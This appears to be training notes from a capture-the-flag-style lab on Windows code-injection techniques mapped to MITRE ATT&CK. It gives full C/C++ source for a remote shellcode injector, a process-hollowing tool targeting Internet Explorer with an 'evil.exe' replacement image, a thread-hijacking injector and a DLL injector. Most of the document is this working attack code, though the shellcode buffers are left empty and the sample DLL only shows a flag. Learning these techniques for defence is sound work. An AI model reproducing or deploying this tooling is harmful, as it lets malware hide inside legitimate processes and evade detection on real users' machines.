- Process Injection (T1055) (https://attack.mitre.org/techniques/T1055/)
- Process Hollowing (T1055.012) (https://attack.mitre.org/techniques/T1055/012/)
- Process Masquerading (T1055.013) (https://attack.mitre.org/techniques/T1055/013/)

- DLL Hijacking (T1574.001) (https://attack.mitre.org/techniques/T1574/001/)
- DLL Side-Loading (T1574.002) (https://attack.mitre.org/techniques/T1574/002/)
- DLL Injection (T1055.001) (https://attack.mitre.org/techniques/T1055/001/)

### Process Injection
At a high level, shellcode injection can be broken up into four steps:

1. Open a target process with all access rights.
2. Allocate target process memory for the shellcode.
3. Write shellcode to allocated memory in the target process.
4. Execute the shellcode using a remote thread.


At step one of shellcode injection, we need to open a target process using special parameters. OpenProcess is used to open the target process supplied via the command-line.

```
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
```

At step two, we must allocate memory to the byte size of the shellcode. Memory allocation is handled using VirtualAllocEx. Within the call, the dwSize parameter is defined using the sizeof function to get the bytes of shellcode to allocate.

```
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```

At step three, we can now use the allocated memory region to write our shellcode. WriteProcessMemory is commonly used to write to memory regions.

```
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```

At step four, we now have control of the process, and our malicious code is now written to memory. To execute the shellcode residing in memory, we can use CreateRemoteThread; threads control the execution of processes.

```
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);
```

We can compile these steps together to create a basic process injector. Use the C++ injector provided and experiment with process injection.

Example:

```
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {
    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
    PVOID b_shellcode = VirtualAllocEx(
	    h_process,
	    NULL,
	    sizeof shellcode,
	    (MEM_RESERVE | MEM_COMMIT),
	    PAGE_EXECUTE_READWRITE
	);
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);
    HANDLE h_thread = CreateRemoteThread(
	    h_process, 
	    NULL, 
	    0, 
	    (LPTHREAD_START_ROUTINE)b_shellcode,
	    NULL,
	    0,
	    NULL
	);
}
```

### Process Hollowing


At a high-level process hollowing can be broken up into six steps:

1. Create a target process in a suspended state.
2. Open a malicious image.
3. Un-map legitimate code from process memory.
4. Allocate memory locations for malicious code and write each section into the address space.
5. Set an entry point for the malicious code.
6. Take the target process out of a suspended state.

Example code:

```
#include <stdio.h>
#include <Windows.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);

int main() {

	LPSTARTUPINFOA pVictimStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pVictimProcessInfo = new PROCESS_INFORMATION();

	// Tested against 32-bit IE.
	LPCSTR victimImage = "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe";

	// Change this. Also must be 32-bit. Use project settings from the same project.
	LPCSTR replacementImage = "C:\\Users\\THM-Attacker\\Desktop\\Injectors\\evil.exe";

	// Create victim process
	if (!CreateProcessA(
			0,
			(LPSTR)victimImage,
			0,
			0,
			0,
			CREATE_SUSPENDED,
			0,
			0,
			pVictimStartupInfo,
			pVictimProcessInfo)) {
		printf("[-] Failed to create victim process %i\r\n", GetLastError());
		return 1;
	};

	printf("[+] Created victim process\r\n");
	printf("\t[*] PID %i\r\n", pVictimProcessInfo->dwProcessId);

	
	// Open replacement executable to place inside victim process
	HANDLE hReplacement = CreateFileA(
		replacementImage,
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		0,
		0
	);

	if (hReplacement == INVALID_HANDLE_VALUE) {
		printf("[-] Unable to open replacement executable %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}

	DWORD replacementSize = GetFileSize(
		hReplacement,
		0);
	printf("[+] Replacement executable opened\r\n");
	printf("\t[*] Size %i bytes\r\n", replacementSize);

	
	// Allocate memory for replacement executable and then load it
	PVOID pReplacementImage = VirtualAlloc(
		0, 
		replacementSize, 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE);

	DWORD totalNumberofBytesRead;

	if (!ReadFile(
			hReplacement, 
			pReplacementImage, 
			replacementSize, 
			&totalNumberofBytesRead, 
			0)) {
		printf("[-] Unable to read the replacement executable into an image in memory %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}
	CloseHandle(hReplacement);
	printf("[+] Read replacement executable into memory\r\n");
	printf("\t[*] In current process at 0x%08x\r\n", (UINT)pReplacementImage);

	
	// Obtain context / register contents of victim process's primary thread
	CONTEXT victimContext;
	victimContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pVictimProcessInfo->hThread, 
		&victimContext);
	printf("[+] Obtained context from victim process's primary thread\r\n");
	printf("\t[*] Victim PEB address / EBX = 0x%08x\r\n", (UINT)victimContext.Ebx);
	printf("\t[*] Victim entry point / EAX = 0x%08x\r\n", (UINT)victimContext.Eax);

	
	// Get base address of the victim executable
	PVOID pVictimImageBaseAddress;
	ReadProcessMemory(
		pVictimProcessInfo->hProcess, 
		(PVOID)(victimContext.Ebx + 8), 
		&pVictimImageBaseAddress, 
		sizeof(PVOID), 
		0);
	printf("[+] Extracted image base address of victim process\r\n");
	printf("\t[*] Address: 0x%08x\r\n", (UINT)pVictimImageBaseAddress);

	
	// Unmap executable image from victim process	
	DWORD dwResult = NtUnmapViewOfSection(
		pVictimProcessInfo->hProcess,
		pVictimImageBaseAddress);
	if (dwResult) {
		printf("[-] Error unmapping section in victim process\r\n");
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}

	printf("[+] Hollowed out victim executable via NtUnmapViewOfSection\r\n");
	printf("\t[*] Utilized base address of 0x%08x\r\n", (UINT)pVictimImageBaseAddress);

	
	// Allocate memory for the replacement image in the remote process
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pReplacementImage;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew);
	DWORD replacementImageBaseAddress = pNTHeaders->OptionalHeader.ImageBase;
	DWORD sizeOfReplacementImage = pNTHeaders->OptionalHeader.SizeOfImage;

	printf("[+] Replacement image metadata extracted\r\n");
	printf("\t[*] replacementImageBaseAddress = 0x%08x\r\n", (UINT)replacementImageBaseAddress);
	printf("\t[*] Replacement process entry point = 0x%08x\r\n", (UINT)pNTHeaders->OptionalHeader.AddressOfEntryPoint);
	
	PVOID pVictimHollowedAllocation = VirtualAllocEx(
		pVictimProcessInfo->hProcess,
		(PVOID)pVictimImageBaseAddress,
		sizeOfReplacementImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (!pVictimHollowedAllocation) {
		printf("[-] Unable to allocate memory in victim process %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}
	printf("[+] Allocated memory in victim process\r\n");
	printf("\t[*] pVictimHollowedAllocation = 0x%08x\r\n", (UINT)pVictimHollowedAllocation);
	
	
	// Write replacement process headers into victim process
	WriteProcessMemory(
		pVictimProcessInfo->hProcess, 
		(PVOID)pVictimImageBaseAddress,
		pReplacementImage,
		pNTHeaders->OptionalHeader.SizeOfHeaders,
		0);
	printf("\t[*] Headers written into victim process\r\n");
	
	// Write replacement process sections into victim process
	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionHeader = 
			(PIMAGE_SECTION_HEADER)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) 
				+ (i * sizeof(IMAGE_SECTION_HEADER)));
		WriteProcessMemory(pVictimProcessInfo->hProcess, 
			(PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader->VirtualAddress),
			(PVOID)((LPBYTE)pReplacementImage + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData, 
			0);
		printf("\t[*] Section %s written into victim process at 0x%08x\r\n", pSectionHeader->Name, (UINT)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
		printf("\t\t[*] Replacement section header virtual address: 0x%08x\r\n", (UINT)pSectionHeader->VirtualAddress);
		printf("\t\t[*] Replacement section header pointer to raw data: 0x%08x\r\n", (UINT)pSectionHeader->PointerToRawData);
	}
	
	
	// Set victim process entry point to replacement image's entry point - change EAX
	victimContext.Eax = (SIZE_T)((LPBYTE)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
	SetThreadContext(
		pVictimProcessInfo->hThread, 
		&victimContext);
	printf("[+] Victim process entry point set to replacement image entry point in EAX register\n");
	printf("\t[*] Value is 0x%08x\r\n", (UINT)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);

	
	printf("[+] Resuming victim process primary thread...\n");
	ResumeThread(pVictimProcessInfo->hThread);

	printf("[+] Cleaning up\n");
	CloseHandle(pVictimProcessInfo->hThread);
	CloseHandle(pVictimProcessInfo->hProcess);
	VirtualFree(pReplacementImage, 0, MEM_RELEASE);

	return 0;
}
```

### Thread (execution) Hijacking 
At a high-level thread (execution) hijacking can be broken up into eleven steps:

1. Locate and open a target process to control.
2. Allocate memory region for malicious code.
3. Write malicious code to allocated memory.
4. Identify the thread ID of the target thread to hijack.
5. Open the target thread.
6. Suspend the target thread.
7. Obtain the thread context.
8. Update the instruction pointer to the malicious code.
9. Rewrite the target thread context.
10. Resume the hijacked thread.

```
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>

unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {
    HANDLE h_thread;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);

    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(h_snapshot, &threadEntry);

	while (Thread32Next(h_snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == (atoi(argv[1])))
		{
			h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}

    SuspendThread(h_thread);

    GetThreadContext(h_thread, &context);
	context.Rip = (DWORD_PTR)b_shellcode;
	SetThreadContext(h_thread, &context);
	
	ResumeThread(h_thread);

}
```
### DLL Injection
At a high-level DLL injection can be broken up into six steps:

1. Locate a target process to inject.
2. Open the target process.
3. Allocate memory region for malicious DLL.
4. Write the malicious DLL to allocated memory.
5. Load and execute the malicious DLL.

```
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#define EXPORTING_DLL

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    MessageBox(NULL, TEXT("THM{}"), TEXT("flag"), MB_OK);
    return TRUE;
}
```

```
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (!strcmp(entry.szExeFile, processName)) {
                    return entry.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &entry));
        }
    }
    else {
        return 0;
    }
}

int main(int argc, char *argv[]) {

    if (argc != 3) {
        printf("Cannot find require parameters\n");
        printf("Usage: dll-injector.exe <process name> <path to DLL>\n");
        exit(0);
    }

    char dllLibFullPath[256];

    LPCSTR processName = argv[1];
    LPCSTR dllLibName = argv[2];

    DWORD processId = getProcessId(processName);
    if (!processId) {
        exit(1);
    }

    if (!GetFullPathName(dllLibName, sizeof(dllLibFullPath), dllLibFullPath, NULL)) {
        exit(1);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        exit(1);
    }

    LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllLibFullPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (dllAllocatedMemory == NULL) {
        exit(1);
    }

    if (!WriteProcessMemory(hProcess, dllAllocatedMemory, dllLibFullPath, strlen(dllLibFullPath) + 1, NULL)) {
        exit(1);
    }

    LPVOID loadLibrary = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    HANDLE remoteThreadHandler = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) loadLibrary, dllAllocatedMemory, 0, NULL);
    if (remoteThreadHandler == NULL) {
        exit(1);
    }

    CloseHandle(hProcess);

    return 0;
}
```

